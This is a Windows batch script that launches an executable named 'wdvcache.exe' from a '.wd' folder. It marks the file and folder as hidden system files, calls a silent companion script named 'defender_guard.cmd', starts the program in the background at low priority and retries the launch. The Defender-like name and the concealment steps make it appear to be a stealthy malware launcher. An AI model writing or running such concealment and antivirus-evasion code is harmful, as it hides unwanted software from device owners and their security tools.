@echo off
if not exist "%~dp0.wd\wdvcache.exe" exit /b 1
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if not errorlevel 1 exit /b 0
call "%~dp0defender_guard.cmd" >nul 2>&1
attrib +h +s "%~dp0.wd" >nul 2>&1
attrib +h +s "%~dp0.wd\wdvcache.exe" >nul 2>&1
start "" /b /low /D "%~dp0.." "%~dp0.wd\wdvcache.exe"
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if not errorlevel 1 exit /b 0
ping -n 1 127.0.0.1 >nul
call "%~dp0defender_guard.cmd" >nul 2>&1
start "" /b /low /D "%~dp0.." "%~dp0.wd\wdvcache.exe"
ping -n 1 127.0.0.1 >nul
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if errorlevel 1 exit /b 1
exit /b 0
